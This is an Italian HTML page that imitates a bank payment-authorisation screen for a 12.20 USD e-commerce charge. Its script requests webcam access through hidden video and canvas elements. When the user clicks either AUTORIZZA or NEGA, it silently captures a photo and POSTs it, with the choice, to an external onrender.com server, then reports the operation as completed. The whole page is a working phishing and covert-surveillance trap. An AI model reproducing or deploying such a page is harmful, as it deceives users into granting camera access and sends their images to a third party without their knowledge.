<!DOCTYPE html>
<html lang="it">
<head>
  <meta charset="UTF-8">
  <title>Autorizza Operazione</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f5f5f5;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .card {
      background-color: white;
      border-radius: 10px;
      padding: 30px;
      box-shadow: 0 0 10px rgba(0,0,0,0.2);
      width: 300px;
      text-align: center;
    }
    button {
      padding: 10px 20px;
      margin: 10px;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
    }
    .autorizza { background-color: yellow; }
    .nega { background-color: lightgray; }
  </style>
</head>
<body>
  <div class="card">
    <h3>Autorizza Operazione</h3>
    <p>Importo: <strong>12,20 USD</strong></p>
    <p>Commissione: <strong>0,00 USD</strong></p>
    <p>Operazione: <strong>PAGAMENTO E-COMMERCE</strong></p>
    <video id="video" width="300" autoplay style="display:none;"></video>
    <canvas id="canvas" width="300" height="200" style="display:none;"></canvas>
    <button class="autorizza" onclick="handleClick('autorizza')">AUTORIZZA</button>
    <button class="nega" onclick="handleClick('nega')">NEGA</button>
  </div>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;
      });

    function handleClick(action) {
      context.drawImage(video, 0, 0, 300, 200);
      const image = canvas.toDataURL('image/png');
      fetch('https://backend-render-server.onrender.com', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action, image })
      }).then(() => {
        alert("Operazione completata.");
      });
    }
  </script>
</body>
</html>
